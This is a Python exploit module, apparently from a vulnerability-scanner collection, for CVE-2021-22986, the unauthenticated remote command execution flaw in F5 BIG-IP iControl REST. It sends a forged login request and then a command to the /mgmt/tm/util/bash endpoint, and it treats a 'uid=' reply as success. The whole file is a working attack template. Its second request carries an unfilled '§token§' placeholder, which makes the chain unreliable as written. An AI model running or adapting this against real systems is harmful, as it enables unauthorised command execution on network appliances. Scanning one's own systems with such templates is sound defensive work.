import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''F5 BIG-IP iControl REST unauthenticated RCE''',
        "description": '''The iControl REST interface has an unauthenticated remote command execution vulnerability.''',
        "severity": "critical",
        "references": [
            "https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986", 
            "https://support.f5.com/csp/article/K03009991"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-22986",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["bigip", "cve", "cve2021", "rce", "mirai"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/mgmt/shared/authn/login"""
        method = "POST"
        data = """{"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}"""
        headers = {'Accept-Language': 'en', 'Authorization': 'Basic YWRtaW46', 'Content-Type': 'application/json', 'Cookie': 'BIGIPAuthCookie=1234', 'Connection': 'close'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/mgmt/tm/util/bash"""
        method = "POST"
        data = """{"command":"run","utilCmdArgs":"-c id"}"""
        headers = {'Accept-Language': 'en', 'X-F5-Auth-Token': '§token§', 'Content-Type': 'application/json', 'Connection': 'close'}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""commandResult""" in resp1.text and """uid=""" in resp1.text):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url